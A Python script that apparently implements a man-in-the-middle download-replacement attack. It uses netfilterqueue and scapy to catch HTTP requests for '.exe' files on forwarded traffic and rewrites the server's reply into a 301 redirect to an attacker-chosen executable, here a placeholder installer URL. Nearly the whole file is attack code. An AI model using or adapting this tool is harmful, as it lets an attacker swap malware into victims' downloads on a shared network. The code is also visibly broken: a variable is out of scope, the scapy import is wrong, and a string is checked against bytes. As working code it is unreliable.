import netfilterqueue
import pyptables
import scapy

ack_list = []


def main():
    # TODO make below an argparse input
    spoof_file = 'https://www.rarlab.com/rar/wrar56b1.exe'
    #setup_iptables()
    try:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()
    except KeyboardInterrupt:
        #TODO This may cause issues because except code isn't executing properly in my enviornment
        print('Resetting IP tables and exiting...')
        #flush_iptables()


def setup_iptables():
    table = pyptables.Table('filter')
    chain = table.chain('FORWARD')
    rule = pyptables.Rule()
    target = pyptables.Target('NFQUEUE')
    target.set_parameter('queue-num', '0')
    rule.target = target
    chain.insert_rule(rule, position=0)


def flush_iptables():
    table = pyptables.Table('filter')
    chain = table.chain('FORWARD')
    chain.flush()


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if '.exe' in scapy_packet[scapy.Raw].load:
                print('[+] .exe Request detected...')
                ack_list.append(scapy_packet[scapy.TCP].ack)
        if scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print('[+] Replacing .exe file...')
                modified_packet = set_load(scapy_packet, f'HTTP/1.1 301 Moved Permanently\nLocation: {spoof_file}\n\n')
                packet.set_payload(bytes(modified_packet))  # Convert scapy packet to bytes for Python 3

    packet.accept()


def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].len
    del packet[scapy.TCP].chksum
    return packet


if __name__ == '__main__':
    main()